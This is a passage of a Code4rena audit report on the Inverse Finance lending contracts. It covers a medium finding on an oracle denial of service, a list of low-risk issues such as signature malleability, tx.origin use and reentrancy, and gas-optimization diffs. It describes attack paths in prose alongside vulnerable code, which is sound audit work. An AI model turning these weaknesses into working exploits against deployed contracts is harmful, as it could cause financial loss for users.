Based on the current implementation, when the protocol wants to use Chainlink oracle data feed for getting a collateral token’s price, the fixed price for the token should not be set. When the fixed price is not set for the token, calling the Oracle contract’s viewPrice or getPrice function will execute uint price = feeds[token].feed.latestAnswer(). As https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles/ mentions, it is possible that Chainlink’s “multisigs can immediately block access to price feeds at will”. When this occurs, executing feeds[token].feed.latestAnswer() will revert so calling the viewPrice and getPrice functions also revert, which cause denial of service when calling functions like getCollateralValueInternal andgetWithdrawalLimitInternal. The getCollateralValueInternal andgetWithdrawalLimitInternal functions are the key elements to the core functionalities, such as borrowing, withdrawing, force-replenishing, and liquidating; with these functionalities facing DOS, the protocol’s usability becomes very limited.

https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L78-L105

    function viewPrice(address token, uint collateralFactorBps) external view returns (uint) {

        if(fixedPrices[token] > 0) return fixedPrices[token];

        if(feeds[token].feed != IChainlinkFeed(address(0))) {

            // get price from feed

            uint price = feeds[token].feed.latestAnswer();

            require(price > 0, "Invalid feed price");

            // normalize price

            uint8 feedDecimals = feeds[token].feed.decimals();

            uint8 tokenDecimals = feeds[token].tokenDecimals;

            uint8 decimals = 36 - feedDecimals - tokenDecimals;

            uint normalizedPrice = price * (10 ** decimals);

            uint day = block.timestamp / 1 days;

            // get today's low

            uint todaysLow = dailyLows[token][day];

            // get yesterday's low

            uint yesterdaysLow = dailyLows[token][day - 1];

            // calculate new borrowing power based on collateral factor

            uint newBorrowingPower = normalizedPrice * collateralFactorBps / 10000;

            uint twoDayLow = todaysLow > yesterdaysLow && yesterdaysLow > 0 ? yesterdaysLow : todaysLow;

            if(twoDayLow > 0 && newBorrowingPower > twoDayLow) {

                uint dampenedPrice = twoDayLow * 10000 / collateralFactorBps;

                return dampenedPrice < normalizedPrice ? dampenedPrice: normalizedPrice;

            }

            return normalizedPrice;


        }

        revert("Price not found");

    }
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L112-L144

    function getPrice(address token, uint collateralFactorBps) external returns (uint) {

        if(fixedPrices[token] > 0) return fixedPrices[token];

        if(feeds[token].feed != IChainlinkFeed(address(0))) {

            // get price from feed

            uint price = feeds[token].feed.latestAnswer();

            require(price > 0, "Invalid feed price");

            // normalize price

            uint8 feedDecimals = feeds[token].feed.decimals();

            uint8 tokenDecimals = feeds[token].tokenDecimals;

            uint8 decimals = 36 - feedDecimals - tokenDecimals;

            uint normalizedPrice = price * (10 ** decimals);

            // potentially store price as today's low

            uint day = block.timestamp / 1 days;

            uint todaysLow = dailyLows[token][day];

            if(todaysLow == 0 || normalizedPrice < todaysLow) {

                dailyLows[token][day] = normalizedPrice;

                todaysLow = normalizedPrice;

                emit RecordDailyLow(token, normalizedPrice);

            }

            // get yesterday's low

            uint yesterdaysLow = dailyLows[token][day - 1];

            // calculate new borrowing power based on collateral factor

            uint newBorrowingPower = normalizedPrice * collateralFactorBps / 10000;

            uint twoDayLow = todaysLow > yesterdaysLow && yesterdaysLow > 0 ? yesterdaysLow : todaysLow;

            if(twoDayLow > 0 && newBorrowingPower > twoDayLow) {

                uint dampenedPrice = twoDayLow * 10000 / collateralFactorBps;

                return dampenedPrice < normalizedPrice ? dampenedPrice: normalizedPrice;

            }

            return normalizedPrice;


        }

        revert("Price not found");

    }
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L344-L347

    function getCreditLimitInternal(address user) internal returns (uint) {

        uint collateralValue = getCollateralValueInternal(user);

        return collateralValue * collateralFactorBps / 10000;

    }
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L323-L327

    function getCollateralValueInternal(address user) internal returns (uint) {

        IEscrow escrow = predictEscrow(user);

        uint collateralBalance = escrow.balance();

        return collateralBalance * oracle.getPrice(address(collateral), collateralFactorBps) / 1 ether;

    }
https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L353-L363

    function getWithdrawalLimitInternal(address user) internal returns (uint) {

        IEscrow escrow = predictEscrow(user);

        uint collateralBalance = escrow.balance();

        if(collateralBalance == 0) return 0;

        uint debt = debts[user];

        if(debt == 0) return collateralBalance;

        if(collateralFactorBps == 0) return 0;

        uint minimumCollateral = debt * 1 ether / oracle.getPrice(address(collateral), collateralFactorBps) * 10000 / collateralFactorBps;

        if(collateralBalance <= minimumCollateral) return 0;

        return collateralBalance - minimumCollateral;

    }
Proof of Concept
The following steps can occur for the described scenario.

Chainlink oracle data feed is used for getting the collateral token’s price so the fixed price for the token is not set.
Alice calls the depositAndBorrow function to deposit some of the collateral token and borrows some DOLA against the collateral.
Chainlink’s multisigs suddenly blocks access to price feeds so executing feeds[token].feed.latestAnswer() will revert.
Alice tries to borrow more DOLA but calling the borrow function, which eventually executes feeds[token].feed.latestAnswer(), reverts.
Alice tries to withdraw the deposited collateral but calling the withdraw function, which eventually executes feeds[token].feed.latestAnswer(), reverts.
Similarly, calling the forceReplenish and liquidate functions would all revert as well.
Tools Used
VSCode

Recommended Mitigation Steps
The Oracle contract’s viewPrice and getPrice functions can be updated to refactor feeds[token].feed.latestAnswer() into try feeds[token].feed.latestAnswer() returns (int256 price) { ... } catch Error(string memory) { ... }. The logic for getting the collateral token’s price from the Chainlink oracle data feed should be placed in the try block while some fallback logic when the access to the Chainlink oracle data feed is denied should be placed in the catch block. If getting the fixed price for the collateral token is considered as a fallback logic, then setting the fixed price for the token should become mandatory, which is different from the current implementation. Otherwise, fallback logic for getting the token’s price from a fallback oracle is needed.

08xmt (Inverse) acknowledged, but disagreed with severity and commented:

In the unlikely event of a chainlink msig block, the protocol can still recover through the use of governance actions to insert a new feed. I’d consider this a Low Severity, as protocol is only DOS’ed for a short period, and can’t be repeatedly DOS’ed.

0xean (judge) commented:

2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.

I don’t think a Medium requires some amount of time for the DOS to be valid, so I think without a mitigation or fallback in place, this is a valid issue and should qualify as Medium.

08xmt (Inverse) commented:

@0xean - That’s fair.

Low Risk and Non-Critical Issues
For this contest, 54 reports were submitted by wardens detailing low risk and non-critical issues. The report highlighted below by 0x1f8b received the top score from the judge.

The following wardens also submitted reports: JC, Deivitto, rbserver, d3e4, cylzxje, tnevler, c7e7eff, adriro, brgltd, horsefacts, c3phas, cryptonue, delfin454000, Aymen0909, Josiah, ReyAdmirado, rotcivegaf, cducrest, robee, gogo, lukris02, Waze, simon135, enckrish, wagmi, immeas, pedr02b2, sakshamguruji, hansfriese, ElKu, neumo, shark, __141345__, cryptostellar5, 0xSmartContract, 0xNazgul, trustindistrust, Rolezn, oyc_109, carlitox477, ch0bu, Diana, B2, evmwanderer, aphak5010, rvierdiiev, chrisdior4, Rahoz, Bnke0x0, Dinesh11G, fatherOfBlocks, RaymondFam, and leosathya.

[01] Allows malleable SECP256K1 signatures
Here, the ecrecover() method doesn’t check the s range.

Homestead (EIP-2) added this limitation, however the precompile remained unaltered. The majority of libraries, including OpenZeppelin, do this check.

Since an order can only be confirmed once and its hash is saved, there doesn’t seem to be a serious danger in existing use cases.

Reference
https://github.com/OpenZeppelin/openzeppelin-contracts/blob/7201e6707f6631d9499a569f492870ebdd4133cf/contracts/utils/cryptography/ECDSA.sol#L138-L149
Affected Source Code
DBR.sol:226-248
Market.sol:425-447
Market.sol:489-511
[02] Lack of checks address(0)
The following methods have a lack of checks if the received argument is an address, it’s good practice in order to reduce human error to check that the address specified in the constructor or initialize is different than address(0).

Affected Source Code
BorrowController.sol:14
BorrowController.sol:26
SimpleERC20Escrow.sol:28
GovTokenEscrow.sol:33-34
INVEscrow.sol:35
INVEscrow.sol:47-48
Fed.sol:37-40
Fed.sol:50
Fed.sol:68
Oracle.sol:32
Oracle.sol:44
DBR.sol:39
DBR.sol:54
Market.sol:77-83
Market.sol:130
Market.sol:136
Market.sol:142
[03] Avoid using tx.origin
tx.origin is a global variable in Solidity that returns the address of the account that sent the transaction.

Using the variable could make a contract vulnerable if an authorized account calls a malicious contract. You can impersonate a user using a third party contract.

This can make it easier to create a vault on behalf of another user with an external administrator (by receiving it as an argument).

Affected Source Code
BorrowController.sol:47
[04] Mixing and Outdated compiler
The pragma version used are:

pragma solidity ^0.8.13;
Note that mixing pragma is not recommended. Because different compiler versions have different meanings and behaviors, it also significantly raises maintenance costs. As a result, depending on the compiler version selected for any given file, deployed contracts may have security issues.

The minimum required version must be 0.8.17; otherwise, contracts will be affected by the following important bug fixes:

0.8.14:

ABI Encoder: When ABI-encoding values from calldata that contain nested arrays, correctly validate the nested array length against calldatasize() in all cases.
Override Checker: Allow changing data location for parameters only when overriding external functions.
0.8.15

Code Generation: Avoid writing dirty bytes to storage when copying bytes arrays.
Yul Optimizer: Keep all memory side-effects of inline assembly blocks.
0.8.16

Code Generation: Fix data corruption that affected ABI-encoding of calldata values represented by tuples: structs at any nesting level; argument lists of external functions, events and errors; return value lists of external functions. The 32 leading bytes of the first dynamically-encoded value in the tuple would get zeroed when the last component contained a statically-encoded array.
0.8.17

Yul Optimizer: Prevent the incorrect removal of storage writes before calls to Yul functions that conditionally terminate the external EVM call.
Apart from these, there are several minor bug fixes and improvements.

[05] Lack of ACK during owner change
It’s possible to lose the ownership under specific circumstances.

Because of human error it’s possible to set a new invalid owner. When you want to change the owner’s address it’s better to propose a new owner, and then accept this ownership with the new wallet.

Affected Source Code
Fed.sol:50
Market.sol:130
[06] Market pause is not checked during contraction
In the Fed contract, during the expansion method is checked that the market is not paused, this requirement is not done during the contraction.

    function contraction(IMarket market, uint amount) public {

        require(msg.sender == chair, "ONLY CHAIR");

        require(dbr.markets(address(market)), "UNSUPPORTED MARKET");

+       require(!market.borrowPaused(), "CANNOT EXPAND PAUSED MARKETS");

        uint supply = supplies[market];

        require(amount <= supply, "AMOUNT TOO BIG"); // can't burn profits

        market.recall(amount);

        dola.burn(amount);

        supplies[market] -= amount;

        globalSupply -= amount;

        emit Contraction(market, amount);

    }
Affected Source Code
Fed.sol:105
[07] Lack of no reentrant modifier
The Market.getEscrow, Fed.expansion and Fed.contraction methods do not have the noReentrant modifier and make calls to an external contract that can take advantage of and call these methods again, but it seems to fail due to the lack of tokens.

However, if any of the other addresses used their receive event to provide liquidity to the contract, the attacking account could benefit from it.

-   function expansion(IMarket market, uint amount) public {

+   function expansion(IMarket market, uint amount) public noReentrant {

        ...

    }


-   function contraction(IMarket market, uint amount) public {

+   function contraction(IMarket market, uint amount) public noReentrant {

        ...

    }
For example, in getEscrow if the escrow allows a callback, it could create two scrows, loosing funds if in this callback it will call again getEscrow, using for example deposit

    function getEscrow(address user) internal returns (IEscrow) {

        if(escrows[user] != IEscrow(address(0))) return escrows[user];

        IEscrow escrow = createEscrow(user);

        escrow.initialize(collateral, user);

        escrows[user] = escrow;

        return escrow;

    }
Bob call deposit.
During the escrow initialization it happend a reentrancy and call again deposit.
The first deposit will be loss in the first escrow.
Please note that current escrows do not allow re-entry, so I decided to use Low. It’s always good to change the storage flags before the externals calls.

Affected Source Code
Fed.sol:86
Fed.sol:103
Market.sol:245
[08] Lack of checks the integer ranges
The following methods lack checks on the following integer arguments, you can see the recommendations above.

Affected Source Code
_replenishmentPriceBps is not checked to be != 0 during the constructor, nevertheless it’s checked in setReplenishmentPriceBps

DBR.sol:36
replenishmentIncentiveBps is not checked to be > 0 during the constructor, nevertheless it’s checked in setReplenismentIncentiveBps

Market.sol:76
[09] Lack of checks supportsInterface
The EIP-165 standard helps detect that a smart contract implements the expected logic, prevents human error when configuring smart contract bindings, so it is recommended to check that the received argument is a contract and supports the expected interface.

Reference
https://eips.ethereum.org/EIPS/eip-165
Affected Source Code
DBR.sol:99
Market.sol:81-83
Market.sol:118
Market.sol:124
[10] Lack of event emit
The Market.pauseBorrows, Market.setLiquidationFeeBps, Market.setLiquidationIncentiveBps, Market.setReplenismentIncentiveBps, Market.setLiquidationFactorBps, Market.setCollateralFactorBps, Market.setBorrowController, Market.setOracle methods do not emit an event when the state changes, something that it’s very important for dApps and users.

Affected Source Code
Market.sol:118
Market.sol:124
Market.sol:149
Market.sol:161
Market.sol:172
Market.sol:183
Market.sol:194
Market.sol:218
[11] Oracle not compatible with tokens of 19 or more decimals
Keep in mind that the version of solidity used, despite being greater than 0.8, does not prevent integer overflows during casting, it only does so in mathematical operations.

In the case that feed.decimals() returns 18, and the token is more than 18 decimals, the following subtraction will cause an underflow, denying the oracle service.

    uint8 feedDecimals = feeds[token].feed.decimals();  // 18 => [ETH/DAI] https://rinkeby.etherscan.io/address/0x74825dbc8bf76cc4e9494d0ecb210f676efa001d#readContract

    uint8 tokenDecimals = feeds[token].tokenDecimals;   // > 18

    uint8 decimals = 36 - feedDecimals - tokenDecimals; // overflow
All pairs have 8 decimals except the ETH pairs, so a token with 19 decimals in ETH, will fault.

Affected Source Code
Oracle.sol:87-98
[12] Wrong visibility
The method accrueDueTokens doesn’t check that the call is made by a market, and it’s public, it should be changed to internal or private to be more resilient.

require(markets[msg.sender], "Only markets can call onBorrow");
Affected Source Code
DBR.sol:284
[13] Bad nomenclature
The interface IERC20 contains two methdos that are not pressent in the official ERC20, delegate and delegates, it’s recommended to change the name of the contract because not any ERC20 it’s valid.

Affected Source Code
GovTokenEscrow.sol:9-10
INVEscrow.sol:10-11
[14] Open TODO
The code that contains “open todos” reflects that the development is not finished and that the code can change a posteriori, prior release, with or without audit.

Affected Source Code
// TODO: Test whether an immutable variable will persist across proxies

INVEscrow.sol:35
[15] Avoid duplicate code
The viewPrice and getPrice methods of the Oracle contract are very similar, the only difference being the following peace of code:

            if(todaysLow == 0 || normalizedPrice < todaysLow) {

                dailyLows[token][day] = normalizedPrice;

                todaysLow = normalizedPrice;

                emit RecordDailyLow(token, normalizedPrice);

            }
It’s recommended to reuse the code in order to be more readable and light.

Affected Source Code
Oracle.sol:126-130
Oracle.sol:79-103
[16] Avoid hardcoded values
It is not good practice to hardcode values, but if you are dealing with addresses much less, these can change between implementations, networks or projects, so it is convenient to remove these values from the source code.

Affected Source Code
Market.sol:44
It’s recommended to create a factor variable for 10000:

Market.sol:74-76
Market.sol:150
Market.sol:162
Market.sol:173
Market.sol:184
Market.sol:195
Market.sol:336
Market.sol:346
Market.sol:360
Market.sol:377
Market.sol:563-564
Market.sol:583
Market.sol:595-606
Gas Optimizations
For this contest, 55 reports were submitted by wardens detailing gas optimizations. The report highlighted below by pfapostol received the top score from the judge.

The following wardens also submitted reports: mcwildy, sakman, JC, tnevler, ajtra, adriro, horsefacts, c3phas, Aymen0909, KoKo, ReyAdmirado, djxploit, robee, gogo, JrNet, 0xRoxas, enckrish, Amithuddar, CloudX, karanctf, Deivitto, Chandr, HardlyCodeMan, __141345__, shark, Shinchan, 0xSmartContract, sakshamguruji, Rolezn, ElKu, oyc_109, kaden, carlitox477, B2, ch0bu, martin, Ozy42, cryptostellar5, Diana, aphak5010, 0x1f8b, skyle, exolorkistis, durianSausage, Rahoz, Bnke0x0, ret2basic, Dinesh11G, ballx, fatherOfBlocks, chaduke, RaymondFam, Mathieu, and leosathya.

Summary
Gas savings are estimated using the gas report of existing forge test --gas-report tests (the sum of all deployment costs and the sum of the costs of calling methods) and may vary depending on the implementation of the fix.

Issue	Instances	Estimated gas(deployments)	Estimated gas(min method call)	Estimated gas(avg method call)	Estimated gas(max method call)
01	State variables only set in the constructor should be declared immutable	2	117 275	104	110	110
02	Use function instead of modifiers	4	115 926	162	-264	-481
03	Duplicated require()/revert() checks should be refactored to a modifier or function	11	114 932	-59	-284	-398
04	Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate	5	24 227	254	533	-6 726
05	Expression can be unchecked when overflow is not possible	6	20 220	410	4 630	1354
06	State variables can be packed into fewer storage slots	1	-5 008	1 911	15 525	20 972
07	Refactoring similar statements	1	18 422	-18	-11	6
08	Better algorithm for underflow check	3	12 613	656	8 332	3 741
09	x = x + y is cheaper than x += y	12	11 214	180	468	616
10	internal functions only called once can be inlined to save gas	1	5 207	67	47	24
11	State variables should be cached in stack variables rather than re-reading them from storage	2	5 007	478	1 117	1 423
Overall gas savings	48	416 802 (6,58%)	3 423 (0,34%)	15 773 (0,82%)	18 283 (0,72%)
Total: 48 instances over 11 issues

[01] State variables only set in the constructor should be declared immutable (2 instances)
Deployment. Gas Saved: 117 275

Minimum Method Call. Gas Saved: 104

Average Method Call. Gas Saved: 110

Maximum Method Call. Gas Saved: 110

Overall gas change: -678 (-0.723%)

Avoids a Gsset (20000 gas) in the constructor, and replaces each Gwarmacces (100 gas) with a PUSH32 (3 gas).

src/DBR.sol:11, 12
NOTE: name and symbol must be within 32 bytes

diff --git a/src/DBR.sol b/src/DBR.sol

index aab6daf..013960f 100644

--- a/src/DBR.sol

+++ b/src/DBR.sol

@@ -8,8 +8,8 @@ pragma solidity ^0.8.13;

    8,   8: */

    9,   9: contract DolaBorrowingRights {

   10,  10: 

-  11     :-    string public name;

-  12     :-    string public symbol;

+       11:+    bytes32 public immutable name;

+       12:+    bytes32 public immutable symbol;

   13,  13:     uint8 public constant decimals = 18;

   14,  14:     uint256 public _totalSupply;

   15,  15:     address public operator;

@@ -34,8 +34,8 @@ contract DolaBorrowingRights {

   34,  34:         address _operator

   35,  35:     ) {

   36,  36:         replenishmentPriceBps = _replenishmentPriceBps;

-  37     :-        name = _name;

-  38     :-        symbol = _symbol;

+       37:+        name = bytes32(bytes(_name));

+       38:+        symbol = bytes32(bytes(_symbol));

   39,  39:         operator = _operator;

   40,  40:         INITIAL_CHAIN_ID = block.chainid;

   41,  41:         INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();

@@ -268,7 +268,7 @@ contract DolaBorrowingRights {

  268, 268:             keccak256(

  269, 269:                 abi.encode(

  270, 270:                     keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),

- 271     :-                    keccak256(bytes(name)),

+      271:+                    keccak256(bytes.concat(name)),

  272, 272:                     keccak256("1"),

  273, 273:                     block.chainid,

  274, 274:                     address(this)
[02] Use function instead of modifiers (4 instances)
Deployment. Gas Saved: 115 926

Minimum Method Call. Gas Saved: 162

Average Method Call. Gas Saved: -264

Maximum Method Call. Gas Saved: -481

Overall gas change: 734 (2.459%)

src/BorrowController.sol:17
diff --git a/src/BorrowController.sol b/src/BorrowController.sol

index 6decad1..080a4e3 100644

--- a/src/BorrowController.sol

+++ b/src/BorrowController.sol

@@ -14,28 +14,36 @@ contract BorrowController {

   14,  14:         operator = _operator;

   15,  15:     }

   16,  16: 

-  17     :-    modifier onlyOperator {

+       17:+    function onlyOperator() private view {

   18,  18:         require(msg.sender == operator, "Only operator");

-  19     :-        _;

   20,  19:     }

   21,  20:     

   22,  21:     /**

   23,  22:     @notice Sets the operator of the borrow controller. Only callable by the operator.

   24,  23:     @param _operator The address of the new operator.

   25,  24:     */

-  26     :-    function setOperator(address _operator) public onlyOperator { operator = _operator; }

+       25:+    function setOperator(address _operator) public { 

+       26:+        onlyOperator();

+       27:+        operator = _operator; 

+       28:+    }

   27,  29: 

   28,  30:     /**

   29,  31:     @notice Allows a contract to use the associated market.

   30,  32:     @param allowedContract The address of the allowed contract

   31,  33:     */

-  32     :-    function allow(address allowedContract) public onlyOperator { contractAllowlist[allowedContract] = true; }

+       34:+    function allow(address allowedContract) public { 

+       35:+        onlyOperator();

+       36:+        contractAllowlist[allowedContract] = true; 

+       37:+    }

   33,  38: 

   34,  39:     /**

   35,  40:     @notice Denies a contract to use the associated market

   36,  41:     @param deniedContract The addres of the denied contract

   37,  42:     */

-  38     :-    function deny(address deniedContract) public onlyOperator { contractAllowlist[deniedContract] = false; }

+       43:+    function deny(address deniedContract) public { 

+       44:+        onlyOperator();

+       45:+        contractAllowlist[deniedContract] = false; 

+       46:+    }

   39,  47: 

   40,  48:     /**

   41,  49:     @notice Checks if a borrow is allowed
src/DBR.sol:44
diff --git a/src/DBR.sol b/src/DBR.sol

index aab6daf..50428cd 100644

--- a/src/DBR.sol

+++ b/src/DBR.sol

@@ -41,16 +41,16 @@ contract DolaBorrowingRights {

   41,  41:         INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();

   42,  42:     }

   43,  43: 

-  44     :-    modifier onlyOperator {

+       44:+    function onlyOperator() private view {

   45,  45:         require(msg.sender == operator, "ONLY OPERATOR");

-  46     :-        _;

   47,  46:     }

   48,  47:     

   49,  48:     /**

   50,  49:     @notice Sets pending operator of the contract. Operator role must be claimed by the new oprator. Only callable by Operator.

   51,  50:     @param newOperator_ The address of the newOperator

   52,  51:     */

-  53     :-    function setPendingOperator(address newOperator_) public onlyOperator {

+       52:+    function setPendingOperator(address newOperator_) public {

+       53:+        onlyOperator();

   54,  54:         pendingOperator = newOperator_;

   55,  55:     }

   56,  56: 

@@ -59,7 +59,8 @@ contract DolaBorrowingRights {

   59,  59:      At 10000, the cost of replenishing 1 DBR is 1 DOLA in debt. Only callable by Operator.

   60,  60:     @param newReplenishmentPriceBps_ The new replen

   61,  61:     */

-  62     :-    function setReplenishmentPriceBps(uint newReplenishmentPriceBps_) public onlyOperator {

+       62:+    function setReplenishmentPriceBps(uint newReplenishmentPriceBps_) public {

+       63:+        onlyOperator();

   63,  64:         require(newReplenishmentPriceBps_ > 0, "replenishment price must be over 0");

   64,  65:         replenishmentPriceBps = newReplenishmentPriceBps_;

   65,  66:     }

@@ -78,7 +79,8 @@ contract DolaBorrowingRights {

   78,  79:     @notice Add a minter to the set of addresses allowed to mint DBR tokens. Only callable by Operator.

   79,  80:     @param minter_ The address of the new minter.

   80,  81:     */

-  81     :-    function addMinter(address minter_) public onlyOperator {

+       82:+    function addMinter(address minter_) public {

+       83:+        onlyOperator();

   82,  84:         minters[minter_] = true;

   83,  85:         emit AddMinter(minter_);

   84,  86:     }

@@ -87,7 +89,8 @@ contract DolaBorrowingRights {

   87,  89:     @notice Removes a minter from the set of addresses allowe to mint DBR tokens. Only callable by Operator.

   88,  90:     @param minter_ The address to be removed from the minter set.

   89,  91:     */

-  90     :-    function removeMinter(address minter_) public onlyOperator {

+       92:+    function removeMinter(address minter_) public {

+       93:+        onlyOperator();

   91,  94:         minters[minter_] = false;

   92,  95:         emit RemoveMinter(minter_);

   93,  96:     }

@@ -96,7 +99,8 @@ contract DolaBorrowingRights {

   96,  99:     @dev markets can be added but cannot be removed. A removed market would result in unrepayable debt for some users.

   97, 100:     @param market_ The address of the new market contract to be added.

   98, 101:     */

-  99     :-    function addMarket(address market_) public onlyOperator {

+      102:+    function addMarket(address market_) public {

+      103:+        onlyOperator();

  100, 104:         markets[market_] = true;

  101, 105:         emit AddMarket(market_);

  102, 106:     }
src/Market.sol:92
diff --git a/src/Market.sol b/src/Market.sol

index 9585b85..796d0d0 100644

--- a/src/Market.sol

+++ b/src/Market.sol

@@ -89,9 +89,8 @@ contract Market {

   89,  89:         INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();

   90,  90:     }

   91,  91:     

-  92     :-    modifier onlyGov {

+       92:+    function onlyGov() private view {

   93,  93:         require(msg.sender == gov, "Only gov can call this function");

-  94     :-        _;

   95,  94:     }

   96,  95: 

   97,  96:     function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {

@@ -115,38 +114,54 @@ contract Market {

  115, 114:     @notice sets the oracle to a new oracle. Only callable by governance.

  116, 115:     @param _oracle The new oracle conforming to the IOracle interface.

  117, 116:     */

- 118     :-    function setOracle(IOracle _oracle) public onlyGov { oracle = _oracle; }

+      117:+    function setOracle(IOracle _oracle) public { 

+      118:+        onlyGov();

+      119:+        oracle = _oracle; 

+      120:+    }

  119, 121: 

  120, 122:     /**

  121, 123:     @notice sets the borrow controller to a new borrow controller. Only callable by governance.

  122, 124:     @param _borrowController The new borrow controller conforming to the IBorrowController interface.

  123, 125:     */

- 124     :-    function setBorrowController(IBorrowController _borrowController) public onlyGov { borrowController = _borrowController; }

+      126:+    function setBorrowController(IBorrowController _borrowController) public { 

+      127:+        onlyGov();

+      128:+        borrowController = _borrowController; 

+      129:+    }

  125, 130: 

  126, 131:     /**

  127, 132:     @notice sets the address of governance. Only callable by governance.

  128, 133:     @param _gov Address of the new governance.

  129, 134:     */

- 130     :-    function setGov(address _gov) public onlyGov { gov = _gov; }

+      135:+    function setGov(address _gov) public { 

+      136:+        onlyGov();

+      137:+        gov = _gov; 

+      138:+    }

  131, 139: 

  132, 140:     /**

  133, 141:     @notice sets the lender to a new lender. The lender is allowed to recall dola from the contract. Only callable by governance.

  134, 142:     @param _lender Address of the new lender.

  135, 143:     */

- 136     :-    function setLender(address _lender) public onlyGov { lender = _lender; }

+      144:+    function setLender(address _lender) public { 

+      145:+        onlyGov();

+      146:+        lender = _lender; 

+      147:+    }

  137, 148: 

  138, 149:     /**

  139, 150:     @notice sets the pause guardian. The pause guardian can pause borrowing. Only callable by governance.

  140, 151:     @param _pauseGuardian Address of the new pauseGuardian.

  141, 152:     */

- 142     :-    function setPauseGuardian(address _pauseGuardian) public onlyGov { pauseGuardian = _pauseGuardian; }

+      153:+    function setPauseGuardian(address _pauseGuardian) public { 

+      154:+        onlyGov();

+      155:+        pauseGuardian = _pauseGuardian; 

+      156:+    }

  143, 157:     

  144, 158:     /**

  145, 159:     @notice sets the Collateral Factor requirement of the market as measured in basis points. 1 = 0.01%. Only callable by governance.

  146, 160:     @dev Collateral factor mus be set below 100%

  147, 161:     @param _collateralFactorBps The new collateral factor as measured in basis points. 

  148, 162:     */

- 149     :-    function setCollateralFactorBps(uint _collateralFactorBps) public onlyGov {

+      163:+    function setCollateralFactorBps(uint _collateralFactorBps) public  {

+      164:+        onlyGov();

  150, 165:         require(_collateralFactorBps < 10000, "Invalid collateral factor");

  151, 166:         collateralFactorBps = _collateralFactorBps;

  152, 167:     }

@@ -158,7 +173,8 @@ contract Market {

  158, 173:     @dev Must be set between 1 and 10000.

  159, 174:     @param _liquidationFactorBps The new liquidation factor in basis points. 1 = 0.01%/

  160, 175:     */

- 161     :-    function setLiquidationFactorBps(uint _liquidationFactorBps) public onlyGov {

+      176:+    function setLiquidationFactorBps(uint _liquidationFactorBps) public  {

+      177:+        onlyGov();

  162, 178:         require(_liquidationFactorBps > 0 && _liquidationFactorBps <= 10000, "Invalid liquidation factor");

  163, 179:         liquidationFactorBps = _liquidationFactorBps;

  164, 180:     }

@@ -169,7 +185,8 @@ contract Market {

  169, 185:     @dev Must be set between 1 and 10000.

  170, 186:     @param _replenishmentIncentiveBps The new replenishment incentive set in basis points. 1 = 0.01%

  171, 187:     */

- 172     :-    function setReplenismentIncentiveBps(uint _replenishmentIncentiveBps) public onlyGov {

+      188:+    function setReplenismentIncentiveBps(uint _replenishmentIncentiveBps) public {

+      189:+        onlyGov();

  173, 190:         require(_replenishmentIncentiveBps > 0 && _replenishmentIncentiveBps < 10000, "Invalid replenishment incentive");

  174, 191:         replenishmentIncentiveBps = _replenishmentIncentiveBps;

  175, 192:     }

@@ -180,7 +197,8 @@ contract Market {

  180, 197:     @dev Must be set between 0 and 10000 - liquidation fee.

  181, 198:     @param _liquidationIncentiveBps The new liqudation incentive set in basis points. 1 = 0.01% 

  182, 199:     */

- 183     :-    function setLiquidationIncentiveBps(uint _liquidationIncentiveBps) public onlyGov {

+      200:+    function setLiquidationIncentiveBps(uint _liquidationIncentiveBps) public {

+      201:+        onlyGov();

  184, 202:         require(_liquidationIncentiveBps > 0 && _liquidationIncentiveBps + liquidationFeeBps < 10000, "Invalid liquidation incentive");

  185, 203:         liquidationIncentiveBps = _liquidationIncentiveBps;

  186, 204:     }

@@ -191,7 +209,8 @@ contract Market {

  191, 209:     @dev Must be set between 0 and 10000 - liquidation factor.

  192, 210:     @param _liquidationFeeBps The new liquidation fee set in basis points. 1 = 0.01%

  193, 211:     */

- 194     :-    function setLiquidationFeeBps(uint _liquidationFeeBps) public onlyGov {

+      212:+    function setLiquidationFeeBps(uint _liquidationFeeBps) public {

+      213:+        onlyGov();

  195, 214:         require(_liquidationFeeBps > 0 && _liquidationFeeBps + liquidationIncentiveBps < 10000, "Invalid liquidation fee");

  196, 215:         liquidationFeeBps = _liquidationFeeBps;

  197, 216:     }
src/Oracle.sol:35
diff --git a/src/Oracle.sol b/src/Oracle.sol

index 14338ed..3e7c608 100644

--- a/src/Oracle.sol

+++ b/src/Oracle.sol

@@ -32,16 +32,18 @@ contract Oracle {

   32,  32:         operator = _operator;

   33,  33:     }

   34,  34: 

-  35     :-    modifier onlyOperator {

+       35:+    function onlyOperator() private view {

   36,  36:         require(msg.sender == operator, "ONLY OPERATOR");

-  37     :-        _;

   38,  37:     }

   39,  38:     

   40,  39:     /**

   41,  40:     @notice Sets the pending operator of the oracle. Only callable by operator.

   42,  41:     @param newOperator_ The address of the pending operator.

   43,  42:     */

-  44     :-    function setPendingOperator(address newOperator_) public onlyOperator { pendingOperator = newOperator_; }

+       43:+    function setPendingOperator(address newOperator_) public { 

+       44:+        onlyOperator();

+       45:+        pendingOperator = newOperator_; 

+       46:+    }

   45,  47: 

   46,  48:     /**

   47,  49:     @notice Sets the price feed of a specific token address.

@@ -50,7 +52,10 @@ contract Oracle {

   50,  52:     @param feed The chainlink feed of the ERC20 token.

   51,  53:     @param tokenDecimals uint8 representing the decimal precision of the token

   52,  54:     */

-  53     :-    function setFeed(address token, IChainlinkFeed feed, uint8 tokenDecimals) public onlyOperator { feeds[token] = FeedData(feed, tokenDecimals); }

+       55:+    function setFeed(address token, IChainlinkFeed feed, uint8 tokenDecimals) public { 

+       56:+        onlyOperator();

+       57:+        feeds[token] = FeedData(feed, tokenDecimals); 

+       58:+    }

   54,  59: 

   55,  60:     /**

   56,  61:     @notice Sets a fixed price for a token

@@ -58,7 +63,10 @@ contract Oracle {

   58,  63:     @param token The address of the fixed price token

